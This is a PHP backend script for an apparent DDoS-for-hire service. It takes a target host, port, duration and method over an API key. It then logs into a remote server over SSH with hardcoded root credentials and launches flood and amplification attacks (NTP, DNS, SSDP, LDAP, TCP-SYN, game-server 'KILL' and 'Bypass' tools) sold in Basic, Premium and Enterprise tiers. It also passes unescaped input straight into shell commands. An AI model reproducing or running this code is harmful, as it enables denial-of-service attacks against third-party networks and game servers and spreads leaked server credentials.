<?php

    // Json App Header
header("Content-Type: application/json");

error_rePorting(E_ALL);
ini_set('display_errors', 'Off');
$startreturn = '';

$GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);

    // Include phpseclib
include('libs/phpseclib/Net/SSH2.php');

    // Check API
$api = $GET['api'];
if($api != 'Gfi65GWgcvgh') {
    $message = array(
        "status" => 'false',
        "message" => 'Invalid API Key'
    );

        // Encode
    $print = json_encode($message);
        // Print
    print_r($print);
    die();
}

$geoproxy = @$GET['geoproxy'];
$stopper = @$GET['stopper'];
$stop =  @$GET['stop'];
if($stop == 1) {
//         stop = STOP
    $command = "screen -X -S {$stopper} quit";
} else if($stop == 0) {
        // Define
    $host = @$GET['host'];
    $method = @$GET['method'];
    (int)$time = @$GET['time'];
    $mode = @$GET['mode'];
	$port = @$GET['port'];

        // Check for empty
    if(empty($host)) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'host is empty.'
            );
        }
    }


    if(empty($method)) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Attack method is empty.'
            );
        }
    }

//Basic
			 if($method == "101") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./GRE $host 1 100000 $time"; }
		else if($method == "102") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./ESP $host 1 100000 $time"; }
		else if($method == "103") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./DNS $host $port dns.txt 1 250000 $time"; }
		else if($method == "104") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./DVR $host $port dvr.txt 1 250000 $time"; }
		else if($method == "105") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./SSDP $host $port ssdp.txt 1 250000 $time"; }
		else if($method == "106") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./NTP $host $port ntp.txt 1 250000 $time"; }
		else if($method == "107") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./SNMP $host $port snmp.txt 1 250000 $time"; }
//Premium
		else if($method == "108") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./LDAP $host $port ldap.txt 1 250000 $time"; }
		else if($method == "109") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./WSD $host $port wsd.txt 1 250000 $time"; }
//Basic		
		else if($method == "110") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./KILL-ALL $host $port 1 100000 $time killall.txt"; }
		else if($method == "111") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-SYNACK $host $port 1 $time 100000"; }
		else if($method == "112") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-SYN $host $port 1 $time"; }
//Premium	
		else if($method == "113") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-IGMP $host $port 1 100000 $time"; }
		else if($method == "114") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-RAND $host $port 1 100000 $time ECE"; }
		else if($method == "115") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-BypassV1 $host $port 1 100000 $time"; }
		else if($method == "116") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./AMONGUS-KILL $host $port $port 0 1 100000 $time amongus"; }
		else if($method == "117") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./ROBLOX-KILL $host $port $port 0 1 100000 $time ts3"; }
		else if($method == "118") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-SOURCE $host $port $port 0 1 100000 $time source"; }
		else if($method == "119") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-SOURCE $host $port $port 0 1 100000 $time gmod"; }
		else if($method == "120") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./FIVEM-BypassV1 $host $port 1 100000 $time"; }
		else if($method == "121") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./FIVEM-BypassV2 $host $port $port 0 1 100000 $time fivem"; }
//Enterprice
		else if($method == "122") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-KILL $host $port 1 100000 $time"; }
		else if($method == "123") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-GAME $host $port 1 $time"; }
		else if($method == "124") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-RAW $host $port 1 100000 $time"; }
		else if($method == "125") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-FAKE $host $port 1 100000 $time"; }
		else if($method == "126") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./TCP-CPU $host $port 5 1 100000 $time"; }
		else if($method == "127") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./OVH-AMP $host $port OVH-AMP.txt 1 250000 $time"; }
		else if($method == "128") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-STORM $host 1 100000 $time"; }
//Basic		
		else if($method == "130") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-GAME $host $port 1 100000 $time"; }
		else if($method == "129") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-HIT $host $port 1 $time"; }
//Premium	
		else if($method == "133") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-VSE $host $port 1 1 $time"; }
		else if($method == "131") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-BYPASSv1 $host $port 1 100000 $time"; }
		else if($method == "132") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999;  screen -dmS {$stopper} ./UDP-BYPASSv2 $host $port 1 100000 random $time"; }
		


    else {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Invalid method. '.$method
            );
        }
    }
}

    // Servers Login Function
$SERVERS = array(
	"38.22.109.52"       =>      array("root", "dkqnz1337c"),
 );

if(empty($message)) {
        // Start Function
    foreach ($SERVERS as $server => $credentials) {
        $ssh = new Net_SSH2($server);
        if ($ssh->login($credentials[0], $credentials[1]) == true) {
            $ssh->exec($command);
            $startreturn = true;
        } else {
            $startreturn = false;
            break;
        }
    }
}

if($startreturn == false) {
    foreach ($SERVERS as $server => $credentials) {
        $ssh = new Net_SSH2($server);
        if ($ssh->login($credentials[0], $credentials[1]) == true) {
            $ssh->exec("screen -X -S {$stopper} quit");
        }
    }
}

if($startreturn == true) {
    if($stop == 1) {
        $message = array(
            "status" => 'true',
            "message" => 'Attack Stopped!'
        );
    } else {
        $message = array(
            "status" => 'true',
            "message" => 'Attack Sent!'
        );
    }
} else if($startreturn == false) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Servers are broken. Please contact supPort!'
        );
    }
} else {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Error!'
        );
    }
}

    // Encode
$print = json_encode($message);
    // Print
print_r($print);
die();

?>